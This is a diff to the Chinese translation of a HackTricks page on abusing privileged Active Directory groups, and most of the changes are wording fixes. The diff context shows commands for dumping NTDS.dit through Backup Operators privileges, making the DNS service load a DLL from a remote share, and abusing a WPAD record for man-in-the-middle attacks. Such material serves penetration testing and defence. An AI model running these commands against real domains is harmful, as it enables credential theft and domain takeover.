@@ -2,14 +2,14 @@
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
 支持HackTricks的其他方式：
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
@@ -28,13 +28,13 @@
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-允许添加新用户，以及在DC01本地登录。
+允许添加新用户，以及在DC01上进行本地登录。
 
 ## AdminSDHolder组
 
 **AdminSDHolder**组的访问控制列表（ACL）至关重要，因为它为Active Directory中的所有“受保护组”（包括高特权组）设置权限。该机制通过防止未经授权的修改，确保了这些组的安全性。
 
-攻击者可以通过修改**AdminSDHolder**组的ACL来利用这一点，授予标准用户完全权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果此用户的权限被更改或移除，由于系统设计的原因，这些权限将在一个小时内自动恢复。
+攻击者可以通过修改**AdminSDHolder**组的ACL来利用这一点，授予标准用户完全权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果此用户的权限被更改或移除，由于系统设计的原因，它们将在一个小时内自动恢复。
 
 用于查看成员和修改权限的命令包括：
 ```powershell
@@ -56,19 +56,17 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 
 除非用户是`Server Operators`组的成员，否则对DC上的文件的访问是受限的，这会改变访问级别。
 
-### 提权
+### 特权升级
 
-使用Sysinternals的`PsService`或`sc`，可以检查和修改服务权限。例如，`Server Operators`组对某些服务拥有完全控制权，允许执行任意命令和提升特权：
+使用Sysinternals的`PsService`或`sc`，可以检查和修改服务权限。例如，`Server Operators`组对某些服务拥有完全控制权，允许执行任意命令和特权升级：
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-这个命令显示`Server Operators`具有完全访问权限，可以操作服务以获取提升的特权。
+这个命令显示`Server Operators`具有完全访问权限，可以操纵服务以获取提升的特权。
 
 ## 备份操作员
 
-加入`Backup Operators`组可以访问`DC01`文件系统，因为具有`SeBackup`和`SeRestore`特权。这些特权使得可以进行文件夹遍历、列出和复制文件的操作，即使没有显式权限，也可以使用`FILE_FLAG_BACKUP_SEMANTICS`标志。执行特定脚本是必要的。 
-
-要列出组成员，请执行：
+加入`Backup Operators`组可以访问`DC01`文件系统，因为具有`SeBackup`和`SeRestore`特权。这些特权使得即使没有明确权限，也可以使用`FILE_FLAG_BACKUP_SEMANTICS`标志进行文件夹遍历、列出和复制文件。执行特定脚本是必要的。要列出组成员，请执行：
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
@@ -93,7 +91,7 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Over
 ```
 ### AD攻击
 
-直接访问域控制器的文件系统允许窃取包含所有域用户和计算机的NTLM哈希的`NTDS.dit`数据库。
+直接访问域控制器的文件系统允许窃取`NTDS.dit`数据库，其中包含所有域用户和计算机的NTLM哈希值。
 
 #### 使用diskshadow.exe
 
@@ -114,7 +112,7 @@ exit
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-或者使用 `robocopy` 进行文件复制：
+或者，使用 `robocopy` 进行文件复制：
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
@@ -150,7 +148,7 @@ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### 执行任意 DLL
 
-成员可以使用诸如以下命令使 DNS 服务器加载任意 DLL（可以是本地的或来自远程共享）：
+成员可以使用诸如以下命令使 DNS 服务器加载任意 DLL（可以是本地的，也可以是来自远程共享的）：
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -178,11 +176,11 @@ sc.exe \\dc01 start dns
 #### Mimilib.dll
 可以使用mimilib.dll进行命令执行，修改它以执行特定命令或反向shell。[查看此文章](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)获取更多信息。
 
-### WPAD记录用于中间人攻击
+### WPAD Record for MitM
 DnsAdmins可以操纵DNS记录，通过在禁用全局查询阻止列表后创建WPAD记录来执行中间人攻击。工具如Responder或Inveigh可用于欺骗和捕获网络流量。
 
-### 事件日志读取者
-成员可以访问事件日志，可能会发现敏感信息，如明文密码或命令执行细节：
+### Event Log Readers
+成员可以访问事件日志，可能会找到敏感信息，如明文密码或命令执行细节：
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -206,12 +204,12 @@ sc.exe start MozillaMaintenance
 ```
 ## 组织管理
 
-在部署**Microsoft Exchange**的环境中，一个名为**Organization Management**的特殊组拥有重要的能力。该组有权限**访问所有域用户的邮箱**，并且控制着**'Microsoft Exchange Security Groups'**组织单位（OU）的**完全控制**。这种控制包括**`Exchange Windows Permissions`**组，可以被利用进行特权升级。
+在部署**Microsoft Exchange**的环境中，一个名为**Organization Management**的特殊组拥有重要的能力。该组有权限**访问所有域用户的邮箱**，并且对**'Microsoft Exchange Security Groups'**组织单元（OU）拥有**完全控制**。这种控制包括**`Exchange Windows Permissions`**组，可以被利用进行特权升级。
 
 ### 特权利用和命令
 
 #### 打印操作员
-**Print Operators**组的成员被赋予多项特权，包括**`SeLoadDriverPrivilege`**，允许他们**在本地登录到域控制器**，关闭它，并管理打印机。要利用这些特权，特别是如果**`SeLoadDriverPrivilege`**在非提升的上下文中不可见，需要绕过用户账户控制（UAC）。
+**Print Operators**组的成员拥有多项特权，包括**`SeLoadDriverPrivilege`**，允许他们**在本地登录到域控制器**，关闭它，并管理打印机。要利用这些特权，特别是如果**`SeLoadDriverPrivilege`**在非提升的上下文中不可见，需要绕过用户账户控制（UAC）。
 
 要列出此组的成员，使用以下PowerShell命令：
 ```powershell
@@ -232,7 +230,7 @@ Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
 #### 服务器操作员
-该组具有在域控制器上执行各种配置的权限，包括备份和恢复特权、更改系统时间和关闭系统。要枚举成员，提供的命令是：
+该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、更改系统时间和关闭系统。要枚举成员，可以使用以下命令：
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
@@ -259,10 +257,10 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 支持HackTricks的其他方式：
 
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)系列
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我们。
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
